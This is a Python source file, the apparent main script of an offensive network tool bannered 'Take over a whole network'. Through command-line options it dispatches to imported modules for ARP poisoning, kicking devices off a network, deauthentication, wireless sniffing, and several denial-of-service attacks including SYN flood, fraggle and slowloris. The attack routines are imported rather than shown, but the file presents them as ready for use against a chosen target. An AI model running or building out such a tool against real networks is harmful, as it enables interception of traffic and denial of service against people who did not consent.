import argparse
import os, sys, time
import logging
logging.getLogger('scapy.runtime').setLevel(logging.ERROR)

try:
    import netifaces
    from scapy.all import *
except ImportError as e:
    print(str(e))
    print("Please install the required modules")
    sys.exit(1)

from lib.access import *
from lib.kick import *
from lib.DoS import *
from lib.recon import *
from lib.attack import *
from lib.mitm import *
from lib.colors import *
import lib.interface as iface

logging.basicConfig(level=logging.DEBUG, format="[{0}%(levelname)s{1}][{2}%(asctime)s{1}]{3}%(message)s{1}".format(LGREEN, RST, BLUE, RD), datefmt="%H:%M:%S")

if os.geteuid() != 0:
    print("Please run as root: sudo {} [OPTION]".format(sys.argv[0]))
    sys.exit(1)

banner = '''{0}
 ___________   __       __   ___  _______    ______  ___      ___  _______   _______
("     _   ") /""\     |/"| /  ")/"     "|  /    " \|"  \    /"  |/"     "| /"      |
 )__/  \ __/ /    \    (: |/   /(: ______) // ____   \   \  //  /(: ______)|:        |
    \ _ /   /' /\  \   |    __/  \/    |  /  /    ) :)\   \/. ./  \/    |  |_____/   ){1}
    |.  |  //  __'  \  (// _  \  // ___)_(: (____/ //  \.    //   // ___)_  //      /
    \:  | /   /  \   \ |: | \  \(:      "|\        /    \    /   (:      "||:  __   |
     \__|(___/    \___)(__|  \__)\_______) \ _____/      \__/     \_______)|__|  \___)
                                
                            ~Take over a whole network~
{2}
'''.format(LRED, RD, RST)

def argument_parser():
    parser = argparse.ArgumentParser()
    attacks = parser.add_argument_group("Attacks")
    recon = parser.add_argument_group("Reconnaissance")
    info = parser.add_argument_group("Information")
    attacks.add_argument("-s", "--spoof", help="ARP", metavar='')
    info.add_argument("-t", "--target", help="Target to attack", metavar='')
    info.add_argument("-i", "--interface", help="Interface to use", metavar='')
    attacks.add_argument("-k", "--kick", help="Kick one/multiple/all people off your network", metavar='')
    attacks.add_argument("-d", "--deauth", help="Send deauth packets to target", metavar='')
    recon.add_argument("-ws", "--wlansniff", help="Wireless sniffer to sniff AP's", action='store_true')
    attacks.add_argument("-D", "--DoS", help="DoS attacks (fraggle [LAN], pingflood, GETflood, SYNflood, slowloris)", metavar='')
    info.add_argument("-T", "--threads", help="Enter how many threads for DoS attack (default=20)", type=int, metavar='')
    info.add_argument("-p", "--port", help="Port to perform attack on", type=int, metavar='')
    info.add_argument("-S", "--sockets", help="Number of sockets to generate for slowloris attack (default=100)", type=int, metavar='')
    info.add_argument("-g", "--gateway", help="insert IP of gateway", metavar='')
    return parser.parse_args()

def check_args(args):
    if args.spoof == "ARP" and args.target:
        if args.gateway:
            gateway = args.gateway
        else:
            gateway = gatewayIP()
        logging.debug(" Starting ARP poisoning on target: {1}{0}{2}".format(args.target, LRED, RST))
        arpattack(args.target, gateway)
    if args.kick == "one" and args.target:
        logging.debug(" Selected: kick one")
        kick = kickout(args.target)
        kick.main()
    if args.wlansniff:
        os.system('clear')
        print(banner)
        logging.debug(" Selected Wireless Sniffing")
        if args.interface:
            interface = args.interface
        else:
            try:
                interface = iface.interfaces().checking()
            except:
                logging.error(" Couldn't get interface into monitor mode, please do it manually")
                sys.exit(1)
        inface = interface
        logging.debug(" Interface: {}\n".format(inface))
        wsniffer = wireless(inface)
        wsniffer.Main()
    if args.DoS and args.target:
        dos = args.DoS
        tgt = args.target
        if args.port:
            port = args.port
        else:
            port = 80
        if args.sockets:
            socks = args.sockets
        else:
            socks = 100
        if not args.threads:
            threads = 20
        else:
            threads = args.threads
        logging.info(" Using {} threads".format(threads))
        if dos == "fraggle":
            logging.debug(" Selected fraggle attack")
            DOSthread(fraggle, tgt, threads)
        elif dos == "GETflood":
            logging.debug(" Selected GET flood attack")
            DOSthread(GETflood, tgt, threads)
        elif dos == "slowloris":
            logging.debug(" Selected slowloris attack")
            slowloris(tgt, socks)
        elif dos == "SYNflood":
            logging.debug(" Selected SYN flood attack")
            DOSthread(synflood, tgt, threads, port=port)
        elif dos == "pingflood":
            logging.debug(" Selected ping flood attack")
            DOSthread(pingflood, tgt, threads)

def Main():
    print(banner)
    args = argument_parser()
    check_args(args)
        
if __name__ == '__main__':
    Main()
